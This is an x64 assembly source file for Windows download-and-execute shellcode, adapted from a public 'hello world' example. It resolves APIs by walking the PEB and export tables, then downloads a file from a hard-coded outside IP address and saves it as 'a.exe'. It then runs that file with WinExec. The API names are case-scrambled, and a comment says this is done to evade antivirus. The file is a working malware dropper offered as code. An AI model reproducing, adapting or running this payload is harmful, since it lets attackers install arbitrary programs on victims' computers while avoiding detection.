;shell64.asm
;License: MIT (http://www.opensource.org/licenses/mit-license.php)
;adapted by NS Oct 2016
 
format PE64 GUI
entry entrypoint

section '.text' code readable writeable executable     ; assumed to be writeable when in memory, no NX obstruction!

 
;note: ExitProcess is forwarded
entrypoint:
    sub rsp, 28h		    ;reserve stack space for called functions
    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned   
 
    lea rdx,[loadlib_func]
    lea rcx,[kernel32_dll]
    call lookup_api	    ;get address of LoadLibraryA
    mov r15, rax	    ;save for later use with forwarded exports
 
    ;; NS lea rcx, [user32_dll]
    lea rcx, [urlmon_dll]
    call rax		    ;load user32.dll
 
    ;;NS   lea rdx, [msgbox_func]
    ;;NS   lea rcx, [user32_dll]
    lea rdx, [URLDownloadToFileA_func]
    ;
    ; NS evade AV
    ;;;;;;mov word [rdx+10],5464h

    lea rcx, [urlmon_dll]
    call lookup_api	    ;get address of MessageBoxA/urldownload
 
;; messagebox....
; NS	xor r9, r9		;MB_OK
; NS	lea r8, [title_str]	  ;caption
; NS	lea rdx, [hello_str]	  ;Hello world
    xor   rcx, rcx	      ;hWnd (NULL)
    xor   r9,r9
    lea   rdx,[url]		; url
    lea   r8, [fname]		; filename
    call  rax			; call the url download
 
;--------- when this is done call WinExec....
    lea rdx, [winexec_func]
    lea rcx, [kernel32_dll]
    call lookup_api	    ;get address of ExitProcess

    lea rcx, [fname]		; set the filename to exectute
    push 1
    pop  rdx
    call rax			; execute...

    lea rdx, [exitproc_func]
    lea rcx, [kernel32_dll]
    call lookup_api	    ;get address of ExitProcess
 
    xor rcx, rcx	    ;exit code zero
    call rax		    ;exit

 
 
kernel32_dll		db  'KERNEL32.DLL', 0
;loadlib_func		 db  'LoadLibraryA', 0
loadlib_func		db  'lOADlIBRARYa', 0h
;;;;user32_dll		db  'USER32.DLL', 0
;;;;msgbox_func 	db  'MessageBoxA', 0
;;;;hello_str		db  'Hello world', 0
;;;;title_str		db  'Message', 0
;;;;exitproc_func	    db	'ExitProcess', 0
exitproc_func		db  'eXITpROCESS', 0
urlmon_dll		db  'URLMON.DLL', 0
;____URLDownloadToFileA_func db  'URLDownloadToFileA', 0
URLDownloadToFileA_func db  'urldOWNLOADtOfILEw', 0h   ; was a at the end...
;;;;winexec_func	    db	'WinExec', 0
winexec_func		db  'wINeXEC', 0

url			db  'h',0,'t',0,'t',0,'p',0,':',0,'/',0,'/',0,'8',0,'2',0,'.',0,'8',0,'0',0,'.',0,'2',0,'7',0,'.',0,'2',0,'0',0,'9',0,'/',0,'a',0,'.',0,'h',0,'t',0,'m',0,0,0
fname			db  'a',0,'.',0,'e',0,'x',0,'e',0,0,0

 
;look up address of function from DLL export table
;rcx=DLL name string, rdx=function name string
;DLL name must be in uppercase
;r15=address of LoadLibraryA (optional, needed if export is forwarded)
;returns address in rax
;returns 0 if DLL not loaded or exported function not found in DLL
lookup_api:
    sub rsp, 28h	    ;set up stack frame in case we call loadlibrary
 
start:
    mov r8, [gs:60h]	    ;peb
    mov r8, [r8+18h]	    ;peb loader data
    lea r12, [r8+10h]	    ;InLoadOrderModuleList (list head) - save for later
    mov r8, [r12]	    ;follow _LIST_ENTRY->Flink to first item in list
    cld
 
for_each_dll:		    ;r8 points to current _ldr_data_table_entry
 
    mov rdi, [r8+60h]	    ;UNICODE_STRING at 58h, actual string buffer at 60h
    mov rsi, rcx	    ;pointer to dll we're looking for
 
compare_dll:
    lodsb		    ;load character of our dll name string
    test al, al 	    ;check for null terminator
    jz found_dll	    ;if at the end of our string and all matched so far, found it
 
    mov ah, [rdi]	    ;get character of current dll
    cmp ah, 61h 	    ;lowercase 'a'
    jl uppercase
    sub ah, 20h 	    ;convert to uppercase
 
uppercase:
    cmp ah, al
    jne wrong_dll	    ;found a character mismatch - try next dll
 
    inc rdi		    ;skip to next unicode character
    inc rdi
    jmp compare_dll	    ;continue string comparison
 
wrong_dll:
    mov r8, [r8]	    ;move to next _list_entry (following Flink pointer)
    cmp r8, r12 	    ;see if we're back at the list head (circular list)
    jne for_each_dll
 
    xor rax, rax	    ;DLL not found
    jmp done
 
found_dll:
    mov rbx, [r8+30h]	    ;get dll base addr - points to DOS "MZ" header
 
    mov r9d, [rbx+3ch]	    ;get DOS header e_lfanew field for offset to "PE" header
    add r9, rbx 	    ;add to base - now r9 points to _image_nt_headers64
    add r9, 88h 	    ;18h to optional header + 70h to data directories
			    ;r9 now points to _image_data_directory[0] array entry
			    ;which is the export directory
 
    mov r13d, [r9]	    ;get virtual address of export directory
    test r13, r13	    ;if zero, module does not have export table
    jnz has_exports
 
    xor rax, rax	    ;no exports - function will not be found in dll
    jmp done
 
has_exports:
    lea r8, [rbx+r13]	    ;add dll base to get actual memory address
			    ;r8 points to _image_export_directory structure (see winnt.h)
 
    mov r14d, [r9+4]	    ;get size of export directory
    add r14, r13	    ;add base rva of export directory
			    ;r13 and r14 now contain range of export directory
			    ;will be used later to check if export is forwarded
 
    mov ecx, [r8+18h]	    ;NumberOfNames
    mov r10d, [r8+20h]	    ;AddressOfNames (array of RVAs)
    add r10, rbx	    ;add dll base
 
    dec ecx		    ;point to last element in array (searching backwards)
for_each_func:
    lea r9, [r10 + 4*rcx]   ;get current index in names array
 
    mov edi, [r9]	    ;get RVA of name
    add rdi, rbx	    ;add base
    mov rsi, rdx	    ;pointer to function we're looking for
 
compare_func:
    xor rax,rax
    mov byte al,[rsi]

    ; check for space
    cmp al,20h
    jnz check_upper_lower
    xor al,55h


check_upper_lower:
    ; upper to lower and viceversa
    cmp al,5bh
    jl	to_lower
to_upper:		    ; to upper
    and al,5fh
    jmp continue_comapre
to_lower:
    test al, al 	    ;check for null terminator
    jz	continue_comapre    ; if NULL - don't add the upper bit
    or	al,20h

continue_comapre:
    mov byte ah,[rdi]
;    cmp ah,5bh
;    jl  to_lower2
to_upper2: ; no to upper
    ;and al,5fh
;    jmp continue_compare2
to_lower2:
;    test ah, ah	     ;check for null terminator
;    jz  continue_compare2    ; if NULL - don't add the upper bit
;    or  ah,20h
;;to_upper:
;;     mov byte ah,[rdi]
;;     and ah, 5fh
;;     mov byte al,[rsi]
;;     and al, 5fh

continue_compare2:
    cmp al,ah
    ; cmpsb
    jne wrong_func	    ;function name doesn't match
 
    mov al, [rsi]	    ;current character of our function
    test al, al 	    ;check for null terminator
    jz found_func	    ;if at the end of our string and all matched so far, found it

    inc rsi
    inc rdi


    jmp compare_func	    ;continue string comparison
 
wrong_func:
    loop for_each_func	    ;try next function in array
 
    xor rax, rax	    ;function not found in export table
    jmp done
 
found_func:		    ;ecx is array index where function name found
 
			    ;r8 points to _image_export_directory structure
    mov r9d, [r8+24h]	    ;AddressOfNameOrdinals (rva)
    add r9, rbx 	    ;add dll base address
    mov cx, [r9+2*rcx]	    ;get ordinal value from array of words
 
    mov r9d, [r8+1ch]	    ;AddressOfFunctions (rva)
    add r9, rbx 	    ;add dll base address
    mov eax, [r9+rcx*4]     ;Get RVA of function using index
 
    cmp rax, r13	    ;see if func rva falls within range of export dir
    jl not_forwarded
    cmp rax, r14	    ;if r13 <= func < r14 then forwarded
    jae not_forwarded
 
    ;forwarded function address points to a string of the form <DLL name>.<function>
    ;note: dll name will be in uppercase
    ;extract the DLL name and add ".DLL"
 
    lea rsi, [rax+rbx]	    ;add base address to rva to get forwarded function name
    lea rdi, [rsp+30h]	    ;using register storage space on stack as a work area
    mov r12, rdi	    ;save pointer to beginning of string
 
copy_dll_name:
    movsb
    cmp byte [rsi], 2eh     ;check for '.' (period) character
    jne copy_dll_name
 
    movsb				;also copy period
    mov dword [rdi], 004c4c44h	    ;add "DLL" extension and null terminator
 
    mov rcx, r12	    ;r12 points to "<DLL name>.DLL" string on stack
    call r15		    ;call LoadLibraryA with target dll
 
    mov rcx, r12	    ;target dll name
    mov rdx, rsi	    ;target function name
    jmp start		    ;start over with new parameters
 
not_forwarded:
    add rax, rbx	    ;add base addr to rva to get function address
done:
    add rsp, 28h	    ;clean up stack
    ret
 
